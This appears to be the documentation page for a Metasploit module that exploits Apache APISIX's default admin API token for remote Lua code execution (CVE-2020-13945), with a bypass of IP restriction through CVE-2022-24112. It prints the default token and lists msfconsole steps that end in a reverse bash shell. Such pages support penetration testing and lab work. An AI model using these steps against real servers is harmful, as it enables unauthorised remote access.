## Vulnerable Application

A default configuration of Apache APISIX (with default API key) is vulnerable to remote code execution.

The Apache APISIX has a default API token `edd1c9f034335f136f87ad84b625c8f1` defined at `conf/config.yaml` and in its default configuration
has doesn't come with the `ip-restriction` plugin enabled, what allow any user to add a new route in its default confiuration.
By leveraging the feature `script` added in the 2.x version an user can add a route which leads to the remote LUA code execution
(CVE-2020-13945). Even if there is ip-restriction enabled, this exploit relay on the vulnerability CVE-2022-24112 to circuvent that
restriction.

This module was tested using a vulnerable docker container as available on the [vulnhub ](https://github.com/vulhub/apisix/CVE-2020-13945/docker-compose.yml) project.

## Verification Steps
Confirm that functionality works:
1. Start `msfconsole`
2. `use exploit/multi/http/apache_apisix_api_default_token_rce`
3. set `RHOSTS` and `RPORT`
4. Confirm the target is vulnerable: `check`
5. Confirm that the target is vulnerable: `The target is vulnerable.`
6. It come already with a default payload `cmd/unix/reverse_bash`
7. set `LHOST` and `LPORT`
8. `exploit`
9. Confirm you have now a cmd session

## Options

### TARGETURI (required)

The path to the APISIX routes controller (Default: `/apisix/admin/routes`).

### API_KEY (required)

The admin API KEY for APISIX (Default: `edd1c9f034335f136f87ad84b625c8f1`).

### ALLOWED_IP (required)

An IP address that is knew to be in the allowed list (Default: `127.0.0.1`).
